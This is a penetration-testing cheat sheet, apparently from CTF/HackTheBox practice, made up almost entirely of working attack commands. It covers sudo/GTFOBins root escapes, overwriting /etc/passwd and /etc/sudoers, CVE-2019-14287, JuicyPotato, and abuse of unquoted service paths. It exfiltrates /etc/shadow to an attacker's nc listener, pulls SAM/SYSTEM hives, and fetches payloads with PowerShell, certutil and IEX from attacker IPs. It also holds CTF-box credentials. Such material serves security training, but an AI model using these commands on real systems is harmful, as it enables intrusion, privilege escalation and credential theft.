	sudo ssh -o ProxyCommand=";/bin/bash 0<&2 1>&2" abc
	id
CURL
	sudo curl http://kali_ip/root/Desktop/passwd -o /etc/passwd
	sudo -u kunal bash
VI EDITOR
	sudo vi
	:!sh
	id
RVIM
	sudo rvim -c ":py3 import pty; pty.spawn('/bin/bash')"
	!bash
	id
VIM
	vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
	
-----------------------------------------------------------	
sudo -l for weak permissions gives you root using GTFOBINS
-----------------------------------------------------------
/bin/ash
/usr/bin/awk
/bin/bash
/bin/sh
/bin/csh
/usr/bin/curl
/bin/dash
/bin/ed
/usr/bin/env
/usr/bin/expect
/usr/bin/find
/usr/bin/ftp
/usr/bin/less
/usr/bin/man
/bin/more
/usr/bin/scp
/usr/bin/socat
/usr/bin/ssh
/usr/bin/vi
/usr/bin/zsh
/usr/bin/pico
/usr/bin/rvim
/usr/bin/perl
/usr/bin/tclsh
/usr/bin/git
/usr/bin/script
/usr/bin/scp

-------------
root via vim
-------------

	:set shell=/bin/bash
	:shell
	
---------------------
Gaining root via wget
---------------------

	REPLACING PASSWD FILE IN VICTIM
	---=---=---=---=---=---=---=---=
		Create a password hash and add it inside passwd file.
		Now use wget in victim as root to replace the original passwd file with ours.
		
			ON KALI
			openssl passwd -1 -salt kunal patel
			python -m SimpleHTTPServer
			
			ON VICTIM
			cd /etc
			wget -O passwd http://kali_ip:8000/passwd
			
			su kunal
			password: patel
			whoami
			#root
			
	EDITING SUDOERS FILE TO GET ROOT
	---=---=---=---=---=---=---=---=
		ON VICTIM
			echo "kunal ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers
			cd /tmp
			python -m SimpleHTTPServer 8080	
			sudo wget 0.0.0.0:8080/tmp/sudoers -O /etc/sudoers		
			Now just run sudo /bin/bash
		
	\\OR//
		
		ON KALI
			echo "kunal ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers
			cd /tmp
			python -m SimpleHTTPServer 8080
			
		ON VICTIM
			wget kali_ip:8080/tmp/sudoers -O /etc/sudoers
		
		Now just run sudo /bin/bash

	STEALING SHADOW FILE FROM THE VICTIM
	---=---=---=---=---=---=---=---=---
	Set	 nc listening server on kali	
			nc -nvlp 80 > shadowhash

		Now in victim machine use
			sudo /user/bin/wget --post-file=/etc/shadow 192.168.x.x(kali_ip)

		and we would get the shadow file of the victim into our kali machine, just use john to crack it (john shadowhash)

---------------------
Gaining root via nmap
---------------------

If nmap is installed in machine
use
	nmap --interactive
	!sh
and you are root
	
Unfortunately it didn't worked at my college pc so i used

	echo "os.execute('/bin/sh')" > /tmp/root.nse
	sudo nmap --script=/tmp/root.nse
	
And got root. You can also make a .sh file for it and run via "nmaproot.sh"


-------------------------
CVE-2019-14287 Sudo vuln 
-------------------------
This vulnerability occurs when sysadmin inserts an entry into the sudoers file
		
For eg:
	sudo -l
	User mahakaal may run the following commands on ubuntu:
		(ALL, !root) /usr/bin/watch
	if this found type 
	sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0' -u

AND YOU ARE ROOT

For eg: If /bin/bash can be run as (ALL, !root)
			(ALL, !root) /bin/bash
				sudo -u#-1 /bin/bash

-----------------
Windows privesc
-------------------------------
(1: Windows-Exploit-Suggester)
-------------------------------
On Victim
   systeminfo > systeminfo.txt
   Transfer this systeminfo.txt into kali

On Kali
	use windows-exploit-suggester.py
	https://github.com/AonCyberLabs/Windows-Exploit-Suggester
	
	python windows-exploit-suggester.py --update
	it generates a xxxx.xlsx file
	
	python windows-exploit-suggester.py --database xxxx.xlsx --systeminfo systeminfo.txt 


-------------------------
(2: Unquoted Servie Path)
-------------------------
 Run powerup.ps1 
	add Invoke-AllChecks in last line of ps1 script so you don't have to write it all times
	Results:
		Let's assume it Shows Unquoted Service Path: c:\Program Filers\Deploy Ready\Service Files\Deploy.exe
		It is vulnerable because is it not in quoted inverted commas("") i.e "C:\..."
		So when this program runs
			It goes into c:\Program Files and executes Deploy.exe
			Then it goes on to Deploy Ready folder and executes Service.exe
			Then it goes on to Service Files folder and executes Deploy.exe
			and so on....
		
	So we can create our own Service.exe with msfvenom and place it in "Deploy Ready" folder
	And then 
		sc start Deploy	

---------------
(3: Hot Potato)
---------------
Never touch a potato when it's hot :P

	Easy to privesc and capture

	JuicyPotato.exe -l 1337 -p C:\Users\Public\Downloads\shell.exe -t * -c {CD5096A1-E7E7-4E09-8B12-CBF2790A87CF}
		Where shell.exe is msfvenom generated reverse shell
		where {1BE1F766-5536-11D1-B726-00C04FB926AF} is CLSID value which is different for different os
		u can use below test_clsid.bat file to check varius matching CLSID with CLSID.list which can be found here: 

Test_clsid.bat
---------------
@echo off
:: Starting port, you can change it
set /a port=1337
SETLOCAL ENABLEDELAYEDEXPANSION

FOR /F %%i IN (CLSID.list) DO (
   echo %%i !port!
   juicypotato.exe -z -l !port! -c %%i >> result.log
   set RET=!ERRORLEVEL!
   :: echo !RET!
   if "!RET!" == "1"  set /a port=port+1
)


===============
port forwarding
===============

On victim if mysql is runnning on 127.0.0.1:3306 and u want to run it on kali then use ssh
-------------------------------------------------------------------------------------------
On victim
	ssh -R 4444:127.0.0.1:3306 root@192.168.{KALI_IP}
On kali
	mysql -u root -h 127.0.0.1 -P 4444
	
	
Tunnel the port running on victim machine to your localhost (using ssh) and access it using a browser:
------------------------------------------------------------------------------------------------------
On kali
	ssh -L 52846:127.0.0.1:52846 jimmy@10.10.10.171
	ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184

====
GREP
====
Grep command is usefull to find a string from many files

Suppose from many file to find IP ADDRESS use
	grep -rn '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
	
To find keyword 'password' from multiple files
	grep -nr 'password'

To list only users from passwd file
	cat /etc/passwd | grep /bin/bash

=======
Strings
=======
strings *.sdf | more

========================
Python Interactive shell
========================
First check python installed or not	
	python -c "print('hello')"
	python3 -c "print('hello')"
	
Once you get reverse shell, if dont wanna accidentally kill it with ctrl+c
	python -c "import pty; pty.spawn('/bin/bash')"
	python3 -c "import pty; pty.spawn('/bin/bash')"
	ctrl+z
	stty raw -echo
	fg
	export TERM=xterm

====
curl
====
So there was a machine (Openadmin) where a port 52846 was running a webservice which was asking for username and password.
But as i didn't had browser as i was on a tty reverse shell, so instead of doing portforwarding and opening it through kali's browser.
I decided to use Curl

	curl -d "username=jimmy&password=n1nj4W4rri0R!" -X POST http://localhost:52846/main.php
		~It Sends POST data with creds	


transfer SAM and SYSTEM file from victim via smb using CURL
	curl --user "guest"  smb://172.31.1.18/backups/windows/system32/config/SAM --output "SAM"
	curl --user "guest"  smb://172.31.1.18/backups/windows/system32/config/SYSTEM --output "SYSTEM"

Upload file using CURl
	curl -u tomcat:'$3cureP4s5w0rd123!' --upload-file shell.war "http://megahosting.htb:8080/manager/text/deploy?path=/lkl&update=true"  


===============
TRANSFER FILES
===============
--------------------
Linux File Transfer
--------------------

Using APACHE
-=-=-=-=-=-=-
sudo apt-get install apache2
service apache2 start
cp xxx /var/www/html
wget http://host/xxx
curl -d http://a/a
gcc xxx -o exploit
chmod 777 exploit
./exploit
whoami

Using SimpleHTTPServer
-=-=-=-=-=-=-=-=-=-=-=
to create a server on current directory

python -m SimpleHTTPServer 800
	Serving HTTP on 0.0.0.0 port 800 ...
	
----------------------
Windows File Transfer
----------------------

to transfer on windows using powershell
	kali	
		python -m SimpleHTTPServer
	Windows
		using powershell
		powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5/PowerUp.ps1','C:\Users\Public\Downloads\PowerUp.ps1')"

		powershell -c wget 'http://10.10.0.38:8000/nc.exe' -outfile 'nc.exe'"
		
		or using internet explorer
		IEX(New-Object Net.Webclient).downloadString('http://10.10.14.5/PowerUp.ps1')

		or using cert util
		certutil -urlcache -f http://10.10.14.5/4120.exe root.exe
		
==============
Bash Scripting
==============
for i in 4444 920 4455; do
nmap -T4 -p $i 10.10.10.12
done;
